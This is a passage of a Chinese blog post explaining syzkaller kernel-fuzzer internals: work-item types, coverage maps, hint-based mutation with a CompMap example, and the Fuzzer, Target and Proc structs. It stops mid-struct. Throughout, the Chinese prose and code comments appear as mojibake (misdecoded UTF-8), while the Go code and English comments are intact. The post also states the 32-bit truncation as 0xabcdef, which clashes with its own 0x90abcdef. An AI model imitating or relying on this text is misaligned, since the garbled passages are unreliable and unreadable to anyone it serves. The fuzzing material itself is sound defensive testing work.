ï¼šå®é™…çš„å•ä¸ªè¾“å…¥é¡¹"></a>10. WorkTriage&#x2F;WorkCandidate&#x2F;WorkSmash ï¼šå®é™…çš„å•ä¸ªè¾“å…¥é¡¹</h3><p>åœ¨ fuzzing è¿‡ç¨‹å½“ä¸­ æˆ‘ä»¬å®é™…ä¸Šä¸ç›´æ¥ä»¥ raw çš„ <code>Prog</code> ä½œä¸ºè¾“å…¥ï¼Œæˆ‘ä»¬è¿˜æƒ³è¦åœ¨è¾“å…¥ä¸Šæ ‡è¯†æ›´å¤šé¢å¤–çš„ä¿¡æ¯â€”â€”å› æ­¤ä¾¿éœ€è¦åŠ ä¸Šä¸€å±‚ wrapperï¼Œä¸€å…±æœ‰å¦‚ä¸‹<strong>ä¸‰ç§ç±»å‹</strong>ï¼š</p><ul><li><code>WorkTriage</code>ï¼šå¯èƒ½æä¾›æ–°çš„è¦†ç›–ç‡çš„ç¨‹åº</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkTriage ä¸ºæˆ‘ä»¬åœ¨åˆæ¬¡æ‰§è¡Œæ—¶æ‰€æ³¨æ„åˆ°çš„æ½œåœ¨æ–°è¦†ç›–çš„ç¨‹åº.</span><br><span class="hljs-comment">// ä½†æˆ‘ä»¬å¹¶ä¸èƒ½ç¡®å®šæ˜¯å¦è¿™æ˜¯çœŸå®çš„è¦†ç›–ç‡.</span><br><span class="hljs-comment">// åœ¨åˆ†ç±»ä¸­æˆ‘ä»¬æ˜ç™½äº†è¿™äº›ç¨‹åºæ˜¯å¦çœŸçš„ç»™å‡ºäº†æ–°çš„è¦†ç›–ç‡ï¼Œ</span><br><span class="hljs-comment">// è‹¥æ˜¯ï¼Œåˆ™å°†å…¶æœ€å°åŒ–å¹¶æ·»åŠ åˆ°è¯­æ–™åº“ä¸­.</span><br><span class="hljs-keyword">type</span> WorkTriage <span class="hljs-keyword">struct</span> &#123;<br>p     *prog.Prog<span class="hljs-comment">/* ç³»ç»Ÿè°ƒç”¨åºåˆ— */</span><br>call  <span class="hljs-type">int</span><span class="hljs-comment">/* interesting çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Ÿ */</span><br>info  ipc.CallInfo<span class="hljs-comment">/* è¿è¡Œç»“æœ */</span><br>flags ProgTypes<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>WorkCandidate</code>ï¼šç”± hubï¼ˆä¹Ÿå°±æ˜¯ syz-managerï¼‰ä¼ æ¥çš„ç¨‹åº</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkCandidate ä¸ºæ¥è‡ª hub çš„ç¨‹åº.</span><br><span class="hljs-comment">// æˆ‘ä»¬æš‚ä¸çŸ¥é“å¥¹ä»¬å¯¹å½“å‰ fuzzer æ˜¯å¦æœ‰ç”¨.</span><br><span class="hljs-comment">// è¿›ç¨‹ä»¥å¯¹æœ¬åœ°ç”Ÿæˆ/å˜å¼‚ç¨‹åºç›¸åŒçš„æ–¹å¼å¤„ç†å¥¹ä»¬.</span><br><span class="hljs-keyword">type</span> WorkCandidate <span class="hljs-keyword">struct</span> &#123;<br>p     *prog.Prog<span class="hljs-comment">/* ç³»ç»Ÿè°ƒç”¨åºåˆ— */</span><br>flags ProgTypes<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>WorkSmash</code>ï¼šåˆšåˆšè¢«åŠ å…¥åˆ°è¯­æ–™åº“ä¸­çš„ç¨‹åº</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkSmash ä¸ºåˆšåˆšæ·»åŠ åˆ°è¯­æ–™åº“ä¸­çš„ç¨‹åº.</span><br><span class="hljs-comment">// åœ¨ smashing è¿‡ç¨‹ä¸­è¿™äº›ç¨‹åºå°†æ”¶åˆ°ä¸€æ¬¡ç‰¹åˆ«çš„å…³æ³¨</span><br><span class="hljs-comment">// (emit faults, collect comparison hints, etc).</span><br><span class="hljs-keyword">type</span> WorkSmash <span class="hljs-keyword">struct</span> &#123;<br>p    *prog.Prog<span class="hljs-comment">/* ç³»ç»Ÿè°ƒç”¨åºåˆ— */</span><br>call <span class="hljs-type">int</span><span class="hljs-comment">/* interesting çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Ÿ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="11-Coverï¼šè¦†ç›–ç‡ä¿¡æ¯"><a href="#11-Coverï¼šè¦†ç›–ç‡ä¿¡æ¯" class="headerlink" title="11. Coverï¼šè¦†ç›–ç‡ä¿¡æ¯"></a>11. Coverï¼šè¦†ç›–ç‡ä¿¡æ¯</h3><p>ä¸»æµçš„ fuzzer éƒ½æ˜¯åŸºäºè¦†ç›–ç‡æŒ‡å¯¼çš„ï¼Œsyzkaller ä¹Ÿä¸ä¾‹å¤–ï¼Œåœ¨ syz-fuzzer ä¸­ä½¿ç”¨ <code>Cover</code> ç»“æ„ä½“è¡¨ç¤ºè¦†ç›–ç‡ä¿¡æ¯ï¼š</p><blockquote><p> æ²¡æœ‰æ³¨é‡Šæ‰€ä»¥ç¬”è€…ä¹Ÿæ²¡å¤ªçœ‹æ˜ç™½æ˜¯æ€ä¹ˆä¸ªæ„æ€ï¼š( </p><p>ç›®å‰æ¨æµ‹ key æ˜¯ program counterï¼Œval ç›®å‰æ— å®é™…æ„ä¹‰åªæ˜¯ç”¨æ¥å ä½è¡¨ç¤ºè¦†ç›–åˆ°äº†è¯¥åœ°å€</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Cover <span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-keyword">struct</span>&#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="è¾“å…¥ç”Ÿæˆå˜å¼‚ç›¸å…³"><a href="#è¾“å…¥ç”Ÿæˆå˜å¼‚ç›¸å…³" class="headerlink" title="è¾“å…¥ç”Ÿæˆå˜å¼‚ç›¸å…³"></a>è¾“å…¥ç”Ÿæˆå˜å¼‚ç›¸å…³</h2><h3 id="0-hint-æœºåˆ¶"><a href="#0-hint-æœºåˆ¶" class="headerlink" title="0. hint æœºåˆ¶"></a>0. hint æœºåˆ¶</h3><p>æˆ‘ä»¬é¦–å…ˆæ¥çœ‹ syz-executor ä¸­ä¸€ä¸ªé‡è¦çš„å˜å¼‚æœºåˆ¶â€”â€”<code>mutate with hint</code> ï¼ˆå¯ä»¥ç†è§£ä¸º hint è¾…åŠ©çš„å˜å¼‚ï¼‰ï¼Œåœ¨ <code>hint.go</code> å¼€å¤´æœ‰å¦‚ä¸‹æ³¨é‡Šï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ä¸€ä¸ª hint å¤§ä½“è€Œè¨€ä¸ºä¸€ä¸ªç”±æŒ‡å‘ä¸€ä¸ªç¨‹åºä¸­ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„ä¸€ä¸ªå‚æ•°çš„æŒ‡é’ˆ</span><br><span class="hljs-comment">// ä¸ä¸€ä¸ªåº”å½“è¢«èµ‹ç»™è¯¥å‚æ•°çš„å€¼ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º replacerï¼‰ç»„æˆ.</span><br><span class="hljs-comment">//ï¼ˆè¯‘æ³¨ï¼šä»€ä¹ˆBé•¿éš¾å¥ï¼‰</span><br><br><span class="hljs-comment">// ä¸€ä¸ªç®€æ˜“ç‰ˆæœ¬çš„ hints workflow å½¢å¦‚:</span><br><span class="hljs-comment">//1. Fuzzer å¯åŠ¨ä¸€ä¸ªç¨‹åº (ç§°ä¹‹ä¸º hint ç§å­) å¹¶ä¸ºç¨‹åºä¸­çš„æ¯ä¸ªç³»ç»Ÿè°ƒç”¨</span><br><span class="hljs-comment">// æ”¶é›†æ‰€æœ‰çš„æ¯”è¾ƒæ•°æ®.</span><br><span class="hljs-comment">//2. æ¥ä¸‹æ¥å…¶å°è¯•å°†æ‰€è·å¾—çš„æ¯”è¾ƒæ“ä½œæ•°çš„å€¼äºè¾“å…¥å‚æ•°å€¼è¿›è¡ŒåŒ¹é….</span><br><span class="hljs-comment">//3. å¯¹äºæ¯ä¸€ä¸ªè¿™æ ·çš„åŒ¹é…ï¼Œfuzzer é€šè¿‡å°†æŒ‡å‘çš„å‚æ•°ä½¿ç”¨ä¿å­˜çš„å€¼è¿›è¡Œæ›¿æ¢æ¥å˜å¼‚ç¨‹åº.</span><br><span class="hljs-comment">//4. è‹¥è·å¾—äº†ä¸€ä¸ªåˆæ³•çš„ç¨‹åº, fuzzer å°†å…¶å¯åŠ¨å¹¶æ£€æŸ¥æ˜¯å¦è·å¾—äº†æ–°çš„è¦†ç›–ç‡.</span><br><span class="hljs-comment">// è¦äº†è§£æ›´å¤šå…³äºç‰¹å®šçªå˜çš„ä¿¡æ¯ï¼Œå‚è§ prog/hints_test.go.</span><br></code></pre></td></tr></table></figure><h3 id="1-CompMapï¼šç”¨ä½œæ¯”è¾ƒçš„å‚æ•°çš„æ”¶ç¼©-x2F-æ‰©å±•æ›¿æ¢å–å€¼è¡¨ã€æ ¸å¿ƒã€‘"><a href="#1-CompMapï¼šç”¨ä½œæ¯”è¾ƒçš„å‚æ•°çš„æ”¶ç¼©-x2F-æ‰©å±•æ›¿æ¢å–å€¼è¡¨ã€æ ¸å¿ƒã€‘" class="headerlink" title="1.CompMapï¼šç”¨ä½œæ¯”è¾ƒçš„å‚æ•°çš„æ”¶ç¼©&#x2F;æ‰©å±•æ›¿æ¢å–å€¼è¡¨ã€æ ¸å¿ƒã€‘"></a>1.CompMapï¼šç”¨ä½œæ¯”è¾ƒçš„å‚æ•°çš„æ”¶ç¼©&#x2F;æ‰©å±•æ›¿æ¢å–å€¼è¡¨ã€æ ¸å¿ƒã€‘</h3><p>CompMap ä¸ºä¸€ä¸ª <code>uint64 </code>åˆ° <code>[uint64 åˆ° bool çš„æ˜ å°„]</code> çš„æ˜ å°„ï¼Œç”¨æ¥åœ¨<strong>è¾“å…¥å˜å¼‚çš„æ—¶å€™è¿›è¡Œå‚æ•°å€¼çš„æ›¿æ¢</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ğŸŒ°: å¯¹äºæ¯”è¾ƒå¯¹ &#123;(op1, op2), (op1, op3), (op1, op4), (op2, op1)&#125;</span><br><span class="hljs-comment">// è¯¥æ˜ å°„å°†å­˜å‚¨å¦‚ä¸‹:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//m = &#123;</span><br><span class="hljs-comment">//op1: &#123;map[op2]: true, map[op3]: true, map[op4]: true&#125;,</span><br><span class="hljs-comment">//op2: &#123;map[op1]: true&#125;</span><br><span class="hljs-comment">//&#125;.</span><br><span class="hljs-keyword">type</span> CompMap <span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-type">bool</span><br></code></pre></td></tr></table></figure><p>çœ‹ç€æ¯”è¾ƒæŠ½è±¡ï¼Œ<del>ç¬”è€…çœ‹äº†åŠå¤©ä¹Ÿä¸çŸ¥é“è¿™â„¢æ˜¯ä¸ªå•¥ç©æ„</del>ï¼Œä¸‹é¢æˆ‘ä»¬ç»“åˆ <code>prog/hints_test.go</code> ä¸­çš„ç¤ºä¾‹æ¥çœ‹ï¼šï¼‰</p><p><strong>æ¡ä»¶åˆ†æ”¯</strong>æ˜¯ç°ä»£ç¼–ç¨‹è¯­è¨€ä¸­çš„ä¸€ä¸ªåŸºæœ¬ç»“æ„ï¼Œä¾‹å¦‚æˆ‘ä»¬æœ‰å¦‚ä¸‹å‡½æ•°ï¼Œå…¶ä¼šæ ¹æ®ä¸åŒçš„å–å€¼è¿›å…¥ä¸åŒçš„åˆ†æ”¯ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Models the following code:</span><br><span class="hljs-comment">// void f(u64 qw) &#123;</span><br><span class="hljs-comment">//u8 b = (u8) qw</span><br><span class="hljs-comment">//u16 w = (u16) qw</span><br><span class="hljs-comment">//u32 dw = (u32) qw</span><br><span class="hljs-comment">//if (b == 0xab) &#123;...&#125;</span><br><span class="hljs-comment">//if (w == 0xcdcd) &#123;...&#125;</span><br><span class="hljs-comment">//if (dw == 0xefefefef) &#123;...&#125;</span><br><span class="hljs-comment">//if (qw == 0x0101010101010101) &#123;...&#125;</span><br><span class="hljs-comment">//  &#125;; f(0x1234567890abcdef);</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç»™è¯¥å‡½æ•°ä¼ å…¥çš„å‚æ•°ä¸º <code>0x1234567890abcdef</code> åœ¨è¯¥å‡½æ•°å½“ä¸­å‚æ•°ç”±äºå¼ºåˆ¶ç±»å‹è½¬æ¢è€Œå‘ç”Ÿäº†<strong>æˆªæ–­</strong>ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º<strong>æ”¶ç¼©</strong>ï¼ˆshrinkï¼‰ï¼Œç”±äºå‚æ•°æˆªæ–­ä¹‹åä¸€ä¸ªæ¡ä»¶éƒ½åŒ¹é…ä¸ä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€ä¸ªåˆ†æ”¯éƒ½è¿›ä¸å»ï¼š(</p><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬æƒ³è¦èµ°è¿›ä¸åŒçš„åˆ†æ”¯è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ <code>0x1234567890abcdef</code> æˆªæ–­æˆ <code>u8</code> åå˜æˆ <code>0xef</code>ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦èµ°è¿›ç¬¬ä¸€ä¸ªæ¡ä»¶åˆ†æ”¯é‚£å°±è¦æ›¿æ¢æˆ <code>0xab</code>ï¼›ç±»ä¼¼åœ°ï¼Œ <code>0x1234567890abcdef</code> æˆªæ–­æˆ <code>u16</code> åå˜æˆ <code>0xcdef</code>ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦èµ°è¿›ç¬¬äºŒä¸ªæ¡ä»¶åˆ†æ”¯é‚£å°±è¦æ›¿æ¢æˆ <code>0xcdcd</code> ï¼› <code>0x1234567890abcdef</code> æˆªæ–­æˆ <code>u32</code> åå˜æˆ <code>0xabcdef</code>ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦èµ°è¿›ç¬¬ä¸‰ä¸ªæ¡ä»¶åˆ†æ”¯é‚£å°±è¦æ›¿æ¢æˆ <code>0xefefef</code> ï¼› è€Œå¦‚æœæˆ‘ä»¬æƒ³è¦èµ°è¿›æœ€åä¸€ä¸ªæ¡ä»¶åˆ†æ”¯ï¼Œåˆ™éœ€è¦å°†å‚æ•°æ•´ä¸ªæ›¿æ¢æˆ <code>0x0101010101010101</code> ï¼Œ<strong>ç”±æ­¤æˆ‘ä»¬å¾—åˆ°å¦‚ä¸‹ CompMap</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">CompMap&#123;<br><span class="hljs-number">0xef</span>:               compSet(<span class="hljs-number">0xab</span>, <span class="hljs-number">0xef</span>),<br><span class="hljs-number">0xcdef</span>:             compSet(<span class="hljs-number">0xcdcd</span>),<br><span class="hljs-number">0x90abcdef</span>:         compSet(<span class="hljs-number">0xefefefef</span>),<br><span class="hljs-number">0x1234567890abcdef</span>: compSet(<span class="hljs-number">0x0101010101010101</span>),<br>&#125;,<br></code></pre></td></tr></table></figure><p>æ ¹æ®è¯¥ <code>CompMap</code> ï¼Œæˆ‘ä»¬æœ€åå¾—åˆ°<strong>å¯ä»¥ç”¨æ¥æ›¿æ¢åŸå‚æ•°çš„æ–°å‚æ•°å€¼ä¸º</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">[]<span class="hljs-type">uint64</span>&#123;<br><span class="hljs-number">0x0101010101010101</span>,<br><span class="hljs-number">0x1234567890abcdab</span>,<br><span class="hljs-number">0x1234567890abcdcd</span>,<br><span class="hljs-number">0x12345678efefefef</span>,<br>&#125;,<br></code></pre></td></tr></table></figure><p>åœ¨ syzkaller çš„å®é™…è¿è¡Œè¿‡ç¨‹å½“ä¸­ï¼Œè¿™äº›æ¯”è¾ƒæ“ä½œæ•°<strong>å¯¹åº”çš„æ˜¯å†…æ ¸ä¸­çš„ä»£ç åˆ†æ”¯</strong>ï¼Œsyzkaller é€šè¿‡ <code>KCOV</code> è·å–è¿™äº›æ¯”è¾ƒæ“ä½œæ•°ï¼Œä»è€Œå¯¹ç¨‹åºè¾“å…¥å˜å¼‚<strong>ä»¥è·å–æ›´é«˜çš„ä»£ç è¦†ç›–ç‡</strong></p><h2 id="å…¨å±€ç®¡æ§ç›¸å…³"><a href="#å…¨å±€ç®¡æ§ç›¸å…³" class="headerlink" title="å…¨å±€ç®¡æ§ç›¸å…³"></a>å…¨å±€ç®¡æ§ç›¸å…³</h2><h3 id="1-Fuzzerï¼šåŸºæœ¬ä¿¡æ¯"><a href="#1-Fuzzerï¼šåŸºæœ¬ä¿¡æ¯" class="headerlink" title="1. Fuzzerï¼šåŸºæœ¬ä¿¡æ¯"></a>1. Fuzzerï¼šåŸºæœ¬ä¿¡æ¯</h3><p><code>Fuzzer</code> ç»“æ„ä½“ç”¨ä»¥å­˜å‚¨ä¸€ä¸ª syz-fuzzer çš„æ‰€æœ‰åŸºæœ¬ä¿¡æ¯ï¼Œå®šä¹‰äº <code>syz-fuzzer/fuzzer.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Fuzzer <span class="hljs-keyword">struct</span> &#123;<br>name        <span class="hljs-type">string</span><br>outputType  OutputType<br>config      *ipc.Config<br>execOpts    *ipc.ExecOpts<br>procs       []*Proc<br>gate        *ipc.Gate<br>workQueue   *WorkQueue<br>needPoll    <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>choiceTable *prog.ChoiceTable<br>noMutate    <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span><br><span class="hljs-comment">// stats åŸŸä¸å¹¸çš„æ— æ³•ä»…æ˜¯ä¸€ä¸ª uint64 æ•°ç»„, å› ä¸ºå…¶åœ¨ 32 ä½å¹³å°ä¸Š</span><br><span class="hljs-comment">// ä¼šé€ æˆ &quot;unaligned 64-bit atomic operation&quot; é”™è¯¯</span><br>stats             []<span class="hljs-type">uint64</span><br>manager           *rpctype.RPCClient<br>target            *prog.Target<br>triagedCandidates <span class="hljs-type">uint32</span><br>timeouts          targets.Timeouts<br><br>faultInjectionEnabled    <span class="hljs-type">bool</span><br>comparisonTracingEnabled <span class="hljs-type">bool</span><br>fetchRawCover            <span class="hljs-type">bool</span><br><br>corpusMu     sync.RWMutex<br>corpus       []*prog.Prog<br>corpusHashes <span class="hljs-keyword">map</span>[hash.Sig]<span class="hljs-keyword">struct</span>&#123;&#125;<br>corpusPrios  []<span class="hljs-type">int64</span><br>sumPrios     <span class="hljs-type">int64</span><br><br>signalMu     sync.RWMutex<br>corpusSignal signal.Signal <span class="hljs-comment">// è¯­æ–™åº“ä¸­çš„è¾“å…¥çš„ä¿¡å·</span><br>maxSignal    signal.Signal <span class="hljs-comment">// åŒ…æ‹¬ flakes åœ¨å†…çš„æ‰€è§‚å¯Ÿåˆ°çš„æœ€å¤§ä¿¡å·</span><br>newSignal    signal.Signal <span class="hljs-comment">// è‡ªä¸Šæ¬¡ä¸ master åŒæ­¥ä»¥æ¥çš„ diff of maxSignal</span><br><br>checkResult *rpctype.CheckArgs<br>logMu       sync.Mutex<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-Targetï¼šç›®æ ‡æ¶æ„ä¿¡æ¯"><a href="#2-Targetï¼šç›®æ ‡æ¶æ„ä¿¡æ¯" class="headerlink" title="2. Targetï¼šç›®æ ‡æ¶æ„ä¿¡æ¯"></a>2. Targetï¼šç›®æ ‡æ¶æ„ä¿¡æ¯</h3><p>å®šä¹‰äº <code>prog/target.go</code> ä¸­çš„ <code>Target</code> ç»“æ„ä½“ç”¨ä»¥è¡¨ç¤º fuzzing ç›®æ ‡æ¶æ„çš„åŸºæœ¬ä¿¡æ¯ï¼š</p><blockquote><p>æ‡’å¾—ç¿»è¯‘äº†ï¼Œå¤ªå¤šå­—äº†ï¼Œè‡ªå·±çœ‹ï¼šï¼‰</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Target describes target OS/arch pair.</span><br><span class="hljs-keyword">type</span> Target <span class="hljs-keyword">struct</span> &#123;<br>OS                <span class="hljs-type">string</span><br>Arch              <span class="hljs-type">string</span><br>Revision          <span class="hljs-type">string</span> <span class="hljs-comment">// unique hash representing revision of the descriptions</span><br>PtrSize           <span class="hljs-type">uint64</span><br>PageSize          <span class="hljs-type">uint64</span><br>NumPages          <span class="hljs-type">uint64</span><br>DataOffset        <span class="hljs-type">uint64</span><br>LittleEndian      <span class="hljs-type">bool</span><br>ExecutorUsesShmem <span class="hljs-type">bool</span><br><br>Syscalls  []*Syscall<br>Resources []*ResourceDesc<br>Consts    []ConstValue<br><br><span class="hljs-comment">// MakeDataMmap creates calls that mmaps target data memory range.</span><br>MakeDataMmap <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> []*Call<br><br><span class="hljs-comment">// Neutralize neutralizes harmful calls by transforming them into non-harmful ones</span><br><span class="hljs-comment">// (e.g. an ioctl that turns off console output is turned into ioctl that turns on output).</span><br><span class="hljs-comment">// fixStructure determines whether it&#x27;s allowed to make structural changes (e.g. add or</span><br><span class="hljs-comment">// remove arguments). It is helpful e.g. when we do neutralization while iterating over the</span><br><span class="hljs-comment">// arguments.</span><br>Neutralize <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *Call, fixStructure <span class="hljs-type">bool</span>)</span></span> <span class="hljs-type">error</span><br><br><span class="hljs-comment">// AnnotateCall annotates a syscall invocation in C reproducers.</span><br><span class="hljs-comment">// The returned string will be placed inside a comment except for the</span><br><span class="hljs-comment">// empty string which will omit the comment.</span><br>AnnotateCall <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c ExecCall)</span></span> <span class="hljs-type">string</span><br><br><span class="hljs-comment">// SpecialTypes allows target to do custom generation/mutation for some struct&#x27;s and union&#x27;s.</span><br><span class="hljs-comment">// Map key is struct/union name for which custom generation/mutation is required.</span><br><span class="hljs-comment">// Map value is custom generation/mutation function that will be called</span><br><span class="hljs-comment">// for the corresponding type. g is helper object that allows generate random numbers,</span><br><span class="hljs-comment">// allocate memory, etc. typ is the struct/union type. old is the old value of the struct/union</span><br><span class="hljs-comment">// for mutation, or nil for generation. The function returns a new value of the struct/union,</span><br><span class="hljs-comment">// and optionally any calls that need to be inserted before the arg reference.</span><br>SpecialTypes <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(g *Gen, typ Type, dir Dir, old Arg)</span></span> (Arg, []*Call)<br><br><span class="hljs-comment">// Resources that play auxiliary role, but widely used throughout all syscalls (e.g. pid/uid).</span><br>AuxResources <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br><span class="hljs-comment">// Additional special invalid pointer values besides NULL to use.</span><br>SpecialPointers []<span class="hljs-type">uint64</span><br><br><span class="hljs-comment">// Special file name length that can provoke bugs (e.g. PATH_MAX).</span><br>SpecialFileLenghts []<span class="hljs-type">int</span><br><br><span class="hljs-comment">// Filled by prog package:</span><br>SyscallMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*Syscall<br>ConstMap   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">uint64</span><br><br>init        sync.Once<br>initArch    <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(target *Target)</span></span><br>types       []Type<br>resourceMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*ResourceDesc<br><span class="hljs-comment">// Maps resource name to a list of calls that can create the resource.</span><br>resourceCtors <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>][]*Syscall<br>any           anyTypes<br><br><span class="hljs-comment">// The default ChoiceTable is used only by tests and utilities, so we initialize it lazily.</span><br>defaultOnce        sync.Once<br>defaultChoiceTable *ChoiceTable<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-Procï¼šsyz-executor-å®ä¾‹å¯¹è±¡"><a href="#3-Procï¼šsyz-executor-å®ä¾‹å¯¹è±¡" class="headerlink" title="3. Procï¼šsyz-executor å®ä¾‹å¯¹è±¡"></a>3. Procï¼šsyz-executor å®ä¾‹å¯¹è±¡</h3><p>åœ¨ syz-fuzzer å½“ä¸­ <code>Proc</code> ç»“æ„ä½“è¢«ç”¨ä»¥è¡¨ç¤º<strong>ä¸€ä¸ª syz-executor å®ä¾‹</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Proc è¡¨ç¤ºä¸€ä¸ªå•ç‹¬çš„ fuzzing ç¨‹åº (executor).</span><br><span class="hljs-keyword">type</span> Proc <span class="hljs-keyword">struct</span> &#123;<br>fuzzer          *Fuzzer<br>pid             